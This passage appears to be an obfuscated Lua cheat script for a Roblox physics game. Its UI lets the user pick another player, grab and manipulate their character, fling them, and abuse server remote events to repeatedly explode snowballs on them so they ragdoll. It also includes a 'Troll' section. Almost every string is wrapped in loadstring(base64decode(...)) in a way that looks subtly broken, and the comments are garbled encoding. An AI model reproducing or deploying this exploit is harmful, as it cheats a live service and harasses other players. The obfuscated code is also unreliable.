                    local hum = targetChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                    if hrp and hum then
                        local ragdolled = hum:FindFirstChild(loadstring(base64decode("UmFnZG9sbGVk"))())
                        if ragdolled and ragdolled.Value == false then
                            task.spawn(function()
                                sp.AssemblyLinearVelocity = Vector3.new(0, 100, 0)
                                sp.CFrame = hrp.CFrame
                                task.wait(0.05)
                                if sp and sp.Parent then
                                    sp.CFrame = CFrame.new(0, 1e9, 0)
                                end
                            end)
                        end
                    end
                end
            end)
        end)
    end

    -- ============================
    -- UI: TARGET DROPDOWN (AUTO REFRESH)
    -- ============================
    local TargetBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("VGFyZ2V0"))(), Side = loadstring(base64decode("TGVmdA=="))()})

    local function FG_GetPlayerList()
        local list = {}
        for _, p in ipairs(FGM.Players:GetPlayers()) do
            if p ~= FGM.LocalPlayer then
                table.insert(list, p.DisplayName .. loadstring(base64decode("IChA"))() .. p.Name .. loadstring(base64decode("KQ=="))())
            end
        end
        table.sort(list)
        return list
    end

    local function FG_GetUsernameFromFormatted(fmt)
        if type(fmt) ~= loadstring(base64decode("c3RyaW5n"))() then return loadstring(base64decode(""))() end
        return fmt:match(loadstring(base64decode("JShAKC4rKSUp"))()) or fmt
    end

    local PlayerDropdown = TargetBlock:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IFRhcmdldA=="))(),
        Items = FG_GetPlayerList(),
        Default = 1,
        Callback = function(Value)
            FGM.State.SelectedTarget = FG_GetUsernameFromFormatted(Value)
        end
    })

    local function updateDropdown()
        if PlayerDropdown then
            local newList = FG_GetPlayerList()
            pcall(function()
                PlayerDropdown:SetItems(newList, true)
                if newList[1] and not FGM.State.SelectedTarget then
                    PlayerDropdown:SetValue(newList[1])
                end
            end)
        end
    end

    task.spawn(function()
        while task.wait(2) do
            updateDropdown()
        end
    end)

    FGM.Players.PlayerAdded:Connect(function()
        task.wait(0.5)
        updateDropdown()
    end)

    FGM.Players.PlayerRemoving:Connect(function()
        task.wait(0.3)
        updateDropdown()
    end)

    -- ============================
    -- UI: FIGURE GRAB TOGGLE
    -- ============================
    local ToggleBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("Q29udHJvbHM="))(), Side = loadstring(base64decode("TGVmdA=="))()})

    ToggleBlock:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIEZpZ3VyZSBHcmFi"))(),
        Default = false,
        Callback = function(Value)
            if Value then
                if not FGM.State.SelectedTarget or FGM.State.SelectedTarget == loadstring(base64decode(""))() then
                    return
                end
                FGM.ToggleFigureGrab()
            else
                if FGM.State.FigureGrabEnabled then
                    FGM.ToggleFigureGrab()
                end
            end
        end
    })

    do

    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
    local LocalPlayer = Players.LocalPlayer

    local Remotes = {
        SpawnToy = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))()),
        SetNetOwner = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()),
        BombExplode = ReplicatedStorage:WaitForChild(loadstring(base64decode("Qm9tYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("Qm9tYkV4cGxvZGU="))()),
        DestroyToy = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
    }

    local snowballActive = false
    local snowballTask = nil

    ToggleBlock:CreateToggle({
        Name = loadstring(base64decode("TG9vcCBTbm93YmFsbChGb3IgcmFnZG9sbCk="))(),
        Default = false,
        Callback = function(v)
            snowballActive = v

            if snowballTask then
                task.cancel(snowballTask)
                snowballTask = nil
            end

            if v then
                snowballTask = task.spawn(function()
                    while snowballActive do
                        local target = FGM.State.SelectedTarget and Players:FindFirstChild(FGM.State.SelectedTarget)
                        if not target or not target.Character then
                            task.wait(0.1)
                            continue 
                        end

                        local tRoot = target.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not tRoot then 
                            task.wait(0.1)
                            continue 
                        end

                        local char = LocalPlayer.Character
                        local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not hrp then 
                            task.wait(0.1)
                            continue 
                        end

                        local inv = Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        if not inv then 
                            task.wait(0.1)
                            continue 
                        end

                        local ball = inv:FindFirstChild(loadstring(base64decode("QmFsbFNub3diYWxs"))())
                        if not ball then
                            task.spawn(function()
                                pcall(function() 
                                    Remotes.SpawnToy:InvokeServer(loadstring(base64decode("QmFsbFNub3diYWxs"))(), hrp.CFrame * CFrame.new(0, 10, 20), Vector3.zero) 
                                end)
                            end)
                            task.wait(0.15)
                        else
                            local SoundPart = ball:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                            if SoundPart then
                                pcall(function() 
                                    Remotes.SetNetOwner:FireServer(SoundPart, SoundPart.CFrame) 
                                end)
                                task.wait(0.05)

                                SoundPart.CFrame = tRoot.CFrame
                                task.wait(0.05)

                                local payload = {
                                    Radius = 0,
                                    Color = Color3.new(0, 0, 0),
                                    TimeLength = 0,
                                    Model = ball,
                                    Type = loadstring(base64decode("U25vd1Bvb2Y="))(),
                                    ExplodesByFire = false,
                                    MaxForcePerStudSquared = 0,
                                    Hitbox = SoundPart,
                                    ImpactSpeed = 0,
                                    ExplodesByPointy = false,
                                    DestroysModel = true,
                                    PositionPart = SoundPart
                                }
                                
                                pcall(function() 
                                    Remotes.BombExplode:FireServer(payload, Vector3.zero) 
                                end)
                                task.wait(0.15)
                            else
                                task.wait(0.1)
                            end
                        end
                    end
                end)
            end
        end
    })
end

    local SettingsBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("U2V0dGluZ3M="))(), Side = loadstring(base64decode("TGVmdA=="))()})

    SettingsBlock:CreateToggle({
        Name = loadstring(base64decode("TWlycm9yIE15IEFuaW1hdGlvbnM="))(),
        Default = false,
        Callback = function(v)
            if FGM.SetAnimationCopy then
                FGM.SetAnimationCopy(v)
            end
        end
    })

    SettingsBlock:CreateToggle({
        Name = loadstring(base64decode("U21vb3RoIE1vdmVtZW50"))(),
        Default = true,
        Callback = function(v)
            FGM.Configuration.DampingEnabled = v
            if not v then
                FGM.State.SmoothedCFrames = {}
            end
        end
    })

    SettingsBlock:CreateSlider({
        Name = loadstring(base64decode("RGFtcGluZyBTcGVlZA=="))(),
        Default = 12,
        Min = 1,
        Max = 60,
        Callback = function(v)
            FGM.Configuration.DampingSpeed = v
        end
    })

    -- ============================
    -- UI: PHYSICS
    -- ============================
    local PhysicsBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("UGh5c2ljcw=="))(), Side = loadstring(base64decode("TGVmdA=="))()})

    PhysicsBlock:CreateToggle({
        Name = loadstring(base64decode("WmVybyBBbGwgVmVsb2NpdGllcw=="))(),
        Default = false,
        Callback = function(v)
            FGM.State.VelSuppressEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = loadstring(base64decode("TG9jayBUb3JzbyBSb3RhdGlvbg=="))(),
        Default = false,
        Callback = function(v)
            FGM.State.LockRotationEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = loadstring(base64decode("S2VlcCBUYXJnZXQgVXByaWdodA=="))(),
        Default = false,
        Callback = function(v)
            FGM.State.ForceUprightEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = loadstring(base64decode("RmFjZSBUb3dhcmQgTWU="))(),
        Default = false,
        Callback = function(v)
            FGM.State.ForceLookAtEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = loadstring(base64decode("QW5jaG9yIHRvIENhbWVyYQ=="))(),
        Default = false,
        Callback = function(v)
            FGM.State.HoldAtCameraEnabled = v
        end
    })

    -- ============================
    -- UI: MOTION
    -- ============================
    local MotionBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("TW90aW9u"))(), Side = loadstring(base64decode("TGVmdA=="))()})

    MotionBlock:CreateToggle({
        Name = loadstring(base64decode("U3BpbiBUYXJnZXQ="))(),
        Default = false,
        Callback = function(v)
            FGM.State.SpinEnabled = v
            FGM.State.SpinAngle = 0
        end
    })

    MotionBlock:CreateSlider({
        Name = loadstring(base64decode("U3BpbiBTcGVlZA=="))(),
        Default = 180,
        Min = 10,
        Max = 720,
        Callback = function(v)
            FGM.State.SpinSpeed = v
        end
    })

    MotionBlock:CreateToggle({
        Name = loadstring(base64decode("W0ZMT0FUXSBPc2NpbGxhdGU="))(),
        Default = false,
        Callback = function(v)
            FGM.State.OscillateEnabled = v
            FGM.State.OscillateTimer = 0
        end
    })

    MotionBlock:CreateSlider({
        Name = loadstring(base64decode("RmxvYXQgU3BlZWQ="))(),
        Default = 2,
        Min = 1,
        Max = 10,
        Callback = function(v)
            FGM.State.OscillateSpeed = v
        end
    })

    MotionBlock:CreateSlider({
        Name = loadstring(base64decode("RmxvYXQgRGlzdGFuY2U="))(),
        Default = 3,
        Min = 1,
        Max = 20,
        Callback = function(v)
            FGM.State.OscillateAmount = v
        end
    })

    -- ============================
    -- UI: LIMB CONTROL
    -- ============================
    local LimbBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("TGltYiBDb250cm9s"))(), Side = loadstring(base64decode("UmlnaHQ="))()})

    LimbBlock:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IEEgTGltYg=="))(),
        Items = LIMB_OPTIONS,
        Default = loadstring(base64decode("SGVhZA=="))(),
        Callback = function(selected)
            FGM.State.SelectedLimb = selected
            if FGM.ApplyLimbHighlight then
                FGM.ApplyLimbHighlight(selected)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = loadstring(base64decode("TGVmdCAvIFJpZ2h0"))(),
        Default = 0,
        Min = -50,
        Max = 50,
        Callback = function(v)
            local section = GetActiveSections().pos
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'X', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = loadstring(base64decode("VXAgLyBEb3du"))(),
        Default = 0,
        Min = -50,
        Max = 50,
        Callback = function(v)
            local section = GetActiveSections().pos
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Y', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = loadstring(base64decode("Rm9yd2FyZCAvIEJhY2s="))(),
        Default = -5,
        Min = -50,
        Max = 50,
        Callback = function(v)
            local section = GetActiveSections().pos
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Z', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = loadstring(base64decode("UGl0Y2ggKFVwIC8gRG93bik="))(),
        Default = 0,
        Min = 0,
        Max = 360,
        Callback = function(v)
            local section = GetActiveSections().rot
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'X', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = loadstring(base64decode("WWF3IChMZWZ0IC8gUmlnaHQp"))(),
        Default = 0,
        Min = 0,
        Max = 360,
        Callback = function(v)
            local section = GetActiveSections().rot
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Y', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = loadstring(base64decode("Um9sbCAoVGlsdCk="))(),
        Default = 0,
        Min = 0,
        Max = 360,
        Callback = function(v)
            local section = GetActiveSections().rot
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Z', v)
            end
        end
    })

    -- ============================
    -- UI: SNAP GRID
    -- ============================
    local SnapBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("U25hcCBHcmlk"))(), Side = loadstring(base64decode("UmlnaHQ="))()})

    SnapBlock:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIFNuYXA="))(),
        Default = false,
        Callback = function(v)
            FGM.Configuration.SnapEnabled = v
        end
    })

    SnapBlock:CreateSlider({
        Name = loadstring(base64decode("UG9zaXRpb24gU3RlcA=="))(),
        Default = 0.5,
        Min = 0.1,
        Max = 5,
        Callback = function(v)
            FGM.Configuration.SnapPosStep = v
        end
    })

    SnapBlock:CreateSlider({
        Name = loadstring(base64decode("Um90YXRpb24gU3RlcA=="))(),
        Default = 15,
        Min = 1,
        Max = 90,
        Callback = function(v)
            FGM.Configuration.SnapRotStep = v
        end
    })

    -- ============================
    -- UI: POSES
    -- ============================
    local PosesBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("UG9zZXM="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

    PosesBlock:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IFBvc2U="))(),
        Items = { 'Pose1', 'Pose2', 'Pose3', 'Pose4', 'Pose5', 'Pose6', 'Pose7', 'JojoStand' },
        Default = 'Pose1',
        Callback = function(v)
            Options.FGM_PresetPose = v
        end
    })

    PosesBlock:CreateButton({
        Name = loadstring(base64decode("QXBwbHkgUG9zZQ=="))(),
        Callback = function()
            if FGM.ApplyPreset then
                local selected = Options.FGM_PresetPose or 'Pose1'
                FGM.ApplyPreset(selected)
            end
        end
    })

    PosesBlock:CreateButton({
        Name = loadstring(base64decode("UmVzZXQgdG8gRGVmYXVsdCBQb3Nl"))(),
        Callback = function()
            if FGM.ResetPose then
                FGM.ResetPose()
            end
        end
    })

    -- ============================
    -- UI: ACTIONS
    -- ============================
    local ActionsBlock = Tabs.Figure:CreateBlock({Name = loadstring(base64decode("QWN0aW9ucw=="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

    ActionsBlock:CreateButton({
        Name = loadstring(base64decode("Rm9yY2UgUmUtR3JhYg=="))(),
        Callback = function()
            local target = FGM.State.TargetCharacter
            if not target then return end
            if FGM.ExecuteGrabTP then
                FGM.ExecuteGrabTP(target)
            end
        end
    })

    ActionsBlock:CreateButton({
        Name = loadstring(base64decode("RnJlZXplIExpbWJz"))(),
        Callback = function()
            if FGM.SnapshotLimbsForFreeze then
                FGM.SnapshotLimbsForFreeze()
            end
            FGM.State.FreezeLimbsEnabled = true
        end
    })

    ActionsBlock:CreateButton({
        Name = loadstring(base64decode("VW5mcmVlemUgTGltYnM="))(),
        Callback = function()
            FGM.State.FreezeLimbsEnabled = false
            FGM.State.FrozenCFrames = {}
        end
    })

    ActionsBlock:CreateButton({
        Name = loadstring(base64decode("UmVsZWFzZSBUYXJnZXQ="))(),
        Callback = function()
            if FGM.State.FigureGrabEnabled then
                FGM.ToggleFigureGrab()
            end
        end
    })
end
do

local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local UIS = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())

local Player = Players.LocalPlayer

local AnimationsGroup = Tabs.Main:CreateBlock({Name = loadstring(base64decode("QW5pbWF0aW9ucw=="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

local animEnabled = false
local currentTrack = nil
local selectedAnimName = loadstring(base64decode("Q3Jhenk="))()
local animSpeed = 1

local Animations = {
    [loadstring(base64decode("SGVhZCBUaHJvdw=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzM1MTU0OTYx"))(),
    [loadstring(base64decode("RmxvYXRpbmcgSGVhZA=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMTU3MjIxNA=="))(),
    [loadstring(base64decode("Q3JvdWNo"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MjcyNDI4OQ=="))(),
    [loadstring(base64decode("Rmxvb3IgQ3Jhd2w="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI4MjU3NDQ0MA=="))(),
    [loadstring(base64decode("RGlubyBXYWxr"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIwNDMyODcxMQ=="))(),
    [loadstring(base64decode("SnVtcGluZyBKYWNrcw=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzQyOTY4MTYzMQ=="))(),
    [loadstring(base64decode("TG9vcCBIZWFk"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzM1MTU0OTYx"))(),
    [loadstring(base64decode("SGVybyBKdW1w"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4NDU3NDM0MA=="))(),
    [loadstring(base64decode("RmFpbnQ="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MTUyNjIzMA=="))(),
    [loadstring(base64decode("Rmxvb3IgRmFpbnQ="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MTUyNTU0Ng=="))(),
    [loadstring(base64decode("U3VwZXIgRmFpbnQ="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MTUyNTU0Ng=="))(),
    [loadstring(base64decode("TGV2aXRhdGU="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMxMzc2MjYzMA=="))(),
    [loadstring(base64decode("RmxvYXQgU2l0"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE3OTIyNDIzNA=="))(),
    [loadstring(base64decode("V2VpcmQgTW92ZQ=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxNTM4NDU5NA=="))(),
    [loadstring(base64decode("Q2xvbmUgSWxsdXNpb24="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxNTM4NDU5NA=="))(),
    [loadstring(base64decode("R2xpdGNoIExldml0YXRl"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMxMzc2MjYzMA=="))(),
    [loadstring(base64decode("RnVsbCBQdW5jaA=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIwNDA2MjUzMg=="))(),
    [loadstring(base64decode("Qm93IERvd24="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIwNDI5MjMwMw=="))(),
    [loadstring(base64decode("U3dvcmQgU2xhbQ=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIwNDI5NTIzNQ=="))(),
    [loadstring(base64decode("TG9vcCBTbGFt"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIwNDI5NTIzNQ=="))(),
    [loadstring(base64decode("TWVnYSBJbnNhbmU="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4NDU3NDM0MA=="))(),
    [loadstring(base64decode("U3VwZXIgUHVuY2g="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyNjc1Mzg0OQ=="))(),
    [loadstring(base64decode("RnVsbCBTd2luZw=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODUwNDU5NA=="))(),
    [loadstring(base64decode("QXJtIFR1cmJpbmU="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI1OTQzODg4MA=="))(),
    [loadstring(base64decode("QmFycmVsIFJvbGw="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzEzNjgwMTk2NA=="))(),
    [loadstring(base64decode("U2NhcmVk"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MDYxMjQ2NQ=="))(),
    [loadstring(base64decode("SW5zYW5l"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMzNzk2MDU5"))(),
    [loadstring(base64decode("QXJtIERldGFjaA=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMzMTY5NTgz"))(),
    [loadstring(base64decode("U3dvcmQgU2xpY2U="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzM1OTc4ODc5"))(),
    [loadstring(base64decode("SW5zYW5lIEFybXM="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI3NDMyNjkx"))(),
    [loadstring(base64decode("RGFi"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzQxMjI0Ng=="))(),
    [loadstring(base64decode("U3Bpbm5lcg=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4ODYzMjAxMQ=="))(),
    [loadstring(base64decode("TW92aW5nIERhbmNl"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzQyOTcwMzczNA=="))(),
    [loadstring(base64decode("U3BpbiBEYW5jZQ=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzQyOTczMDQzMA=="))(),
    [loadstring(base64decode("TW9vbiBEYW5jZQ=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzQ1ODM0OTI0"))(),
    [loadstring(base64decode("U3BpbiBEYW5jZSAy"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4NjkzNDkxMA=="))(),
    [loadstring(base64decode("VGhyaWxsZXI="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI3Nzg5MzU5"))(),
    [loadstring(base64decode("Um9ib3Q="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMwMTk2MTE0"))(),
    [loadstring(base64decode("U2h1ZmZsZQ=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI0ODI2MzI2MA=="))(),
    [loadstring(base64decode("R3Jvb3Zl"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMzNzk2MDU5"))(),
    [loadstring(base64decode("Q2x1Yg=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI4NDg4MjU0"))(),
    [loadstring(base64decode("SnVtcCBEYW5jZQ=="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzUyMTU1NzI4"))(),
    [loadstring(base64decode("Q3Jhenk="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzI0ODI2MzI2MA=="))(),
    [loadstring(base64decode("Q29sbGFwc2U="))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzM1MTU0OTYx"))(),
    [loadstring(base64decode("Wm9tYmll"))()] = loadstring(base64decode("cmJ4YXNzZXRpZDovLzMzNzk2MDU5"))(),
}

function playAnimation()
    local char = Player.Character or Player.CharacterAdded:Wait()
    local hum = char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
    if not hum then return end
    local animator = hum:FindFirstChildOfClass(loadstring(base64decode("QW5pbWF0b3I="))())
    if not animator then
        animator = Instance.new(loadstring(base64decode("QW5pbWF0b3I="))())
        animator.Parent = hum
    end
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    local anim = Instance.new(loadstring(base64decode("QW5pbWF0aW9u"))())
    anim.AnimationId = Animations[selectedAnimName]
    currentTrack = animator:LoadAnimation(anim)
    currentTrack.Priority = Enum.AnimationPriority.Action
    currentTrack.Looped = true
    currentTrack:Play()
    currentTrack:AdjustSpeed(animSpeed)

    task.spawn(function()
        while animEnabled and currentTrack do
            if currentTrack.TimePosition > 5 then
                currentTrack.TimePosition = 0.3
            end
            task.wait(0.05)
        end
    end)
end

function stopAnimation()
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
end

AnimationsGroup:CreateToggle({
    Name = loadstring(base64decode("UGxheSBBbmltYXRpb24="))(),
    Flag = loadstring(base64decode("UGxheSBBbmltYXRpb24="))(),
    Default = false,
    Callback = function(on)
        SetToggleState(loadstring(base64decode("UGxheSBBbmltYXRpb24="))(), on)
        animEnabled = on
        if on then
            playAnimation()
        else
            stopAnimation()
        end
    end
})

AnimationsGroup:CreateDropdown({
    Name = loadstring(base64decode("QW5pbWF0aW9u"))(),
    Items = {
        loadstring(base64decode("SGVhZCBUaHJvdw=="))(),
        loadstring(base64decode("RmxvYXRpbmcgSGVhZA=="))(),
        loadstring(base64decode("Q3JvdWNo"))(),
        loadstring(base64decode("Rmxvb3IgQ3Jhd2w="))(),
        loadstring(base64decode("RGlubyBXYWxr"))(),
        loadstring(base64decode("SnVtcGluZyBKYWNrcw=="))(),
        loadstring(base64decode("TG9vcCBIZWFk"))(),
        loadstring(base64decode("SGVybyBKdW1w"))(),
        loadstring(base64decode("RmFpbnQ="))(),
        loadstring(base64decode("Rmxvb3IgRmFpbnQ="))(),
        loadstring(base64decode("U3VwZXIgRmFpbnQ="))(),
        loadstring(base64decode("TGV2aXRhdGU="))(),
        loadstring(base64decode("RmxvYXQgU2l0"))(),
        loadstring(base64decode("V2VpcmQgTW92ZQ=="))(),
        loadstring(base64decode("Q2xvbmUgSWxsdXNpb24="))(),
        loadstring(base64decode("R2xpdGNoIExldml0YXRl"))(),
        loadstring(base64decode("RnVsbCBQdW5jaA=="))(),
        loadstring(base64decode("Qm93IERvd24="))(),
        loadstring(base64decode("U3dvcmQgU2xhbQ=="))(),
        loadstring(base64decode("TG9vcCBTbGFt"))(),
        loadstring(base64decode("TWVnYSBJbnNhbmU="))(),
        loadstring(base64decode("U3VwZXIgUHVuY2g="))(),
        loadstring(base64decode("RnVsbCBTd2luZw=="))(),
        loadstring(base64decode("QXJtIFR1cmJpbmU="))(),
        loadstring(base64decode("QmFycmVsIFJvbGw="))(),
        loadstring(base64decode("U2NhcmVk"))(),
        loadstring(base64decode("SW5zYW5l"))(),
        loadstring(base64decode("QXJtIERldGFjaA=="))(),
        loadstring(base64decode("U3dvcmQgU2xpY2U="))(),
        loadstring(base64decode("SW5zYW5lIEFybXM="))(),
        loadstring(base64decode("RGFi"))(),
        loadstring(base64decode("U3Bpbm5lcg=="))(),
        loadstring(base64decode("TW92aW5nIERhbmNl"))(),
        loadstring(base64decode("U3BpbiBEYW5jZQ=="))(),
        loadstring(base64decode("TW9vbiBEYW5jZQ=="))(),
        loadstring(base64decode("U3BpbiBEYW5jZSAy"))(),
        loadstring(base64decode("VGhyaWxsZXI="))(),
        loadstring(base64decode("Um9ib3Q="))(),
        loadstring(base64decode("U2h1ZmZsZQ=="))(),
        loadstring(base64decode("R3Jvb3Zl"))(),
        loadstring(base64decode("Q2x1Yg=="))(),
        loadstring(base64decode("SnVtcCBEYW5jZQ=="))(),
        loadstring(base64decode("Q3Jhenk="))(),
        loadstring(base64decode("Q29sbGFwc2U="))(),
        loadstring(base64decode("Wm9tYmll"))(),
    },
    Default = loadstring(base64decode("Q3Jhenk="))(),
    Callback = function(v)
        selectedAnimName = v
        if animEnabled then
            playAnimation()
        end
    end
})

AnimationsGroup:CreateSlider({
    Name = loadstring(base64decode("U3BlZWQ="))(),
    Default = 1,
    Min = 0.1,
    Max = 100,
    Callback = function(v)
        animSpeed = v
        if currentTrack and currentTrack.IsPlaying then
            currentTrack:AdjustSpeed(v)
        end
    end
})

local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local Player = Players.LocalPlayer

function getNearestBlobman(maxDist)
	local char = Player.Character
	local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	if not hrp then
		return
	end
	local nearest, dist = nil, maxDist or 50
	for _, model in ipairs(workspace:GetDescendants()) do
		if model:IsA(loadstring(base64decode("TW9kZWw="))()) and model.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
			local root = model:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or model.PrimaryPart
			if root then
				local d = (root.Position - hrp.Position).Magnitude
				if d < dist then
					dist = d
					nearest = model
				end
			end
		end
	end
	return nearest
end

function SitOnBlobman()
	local char = Player.Character
	if not char then
		return
	end
	local hum = char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
	local hrp = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	if not hum or not hrp then
		return
	end

    -- СѓР¶Рµ СЃРёРґРёРј
	if hum.SeatPart then
		return
	end

    -- РёС‰РµРј Р‘Р›РР–РђР™РЁР•Р“Рћ
	local blob = getNearestBlobman(40)
	if not blob then
		warn(loadstring(base64decode("QmxvYm1hbiBub3QgZm91bmQgbmVhcmJ5"))())
		return
	end

    -- РёС‰РµРј СЃРёРґ
	local seat =
        blob:FindFirstChildWhichIsA(loadstring(base64decode("U2VhdA=="))(), true)
        or blob:FindFirstChildWhichIsA(loadstring(base64decode("VmVoaWNsZVNlYXQ="))(), true)
	if not seat then
		warn(loadstring(base64decode("QmxvYm1hbiBzZWF0IG5vdCBmb3VuZA=="))())
		return
	end

    -- С‚РµР»РµРїРѕСЂС‚ Р РЇР”РћРњ СЃ Р±Р»РѕР±РѕРј (РЅРµ РІ РµР±РµРЅСЏ)
	hrp.CFrame = seat.CFrame * CFrame.new(0, 1.2, -1)
	task.wait(0.05)

    -- РџР РРќРЈР”РРўР•Р›Р¬РќРђРЇ РџРћРЎРђР”РљРђ
	pcall(function()
		seat:Sit(hum)
	end)
end


KeybindsGroup:CreateKeybind({
	Name = loadstring(base64decode("U2l0IG9uIG5lYXJlc3QgQmxvYm1hbg=="))(),
	Flag = loadstring(base64decode("U2l0QmxvYm1hbktleQ=="))(),
	Default = loadstring(base64decode("Wg=="))(),
	Callback = function()
		SitOnBlobman()
	end
})


do
local TrollExtraGroup = Tabs.Main:CreateBlock({Name = loadstring(base64decode("VHJvbGw="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())

local playBangActive = false
local bangAnimTrack = nil
local bangAnimId = loadstring(base64decode("cmJ4YXNzZXRpZDovLzE0ODg0MDM3MQ=="))() -- Bang РёР· Infinite Yield
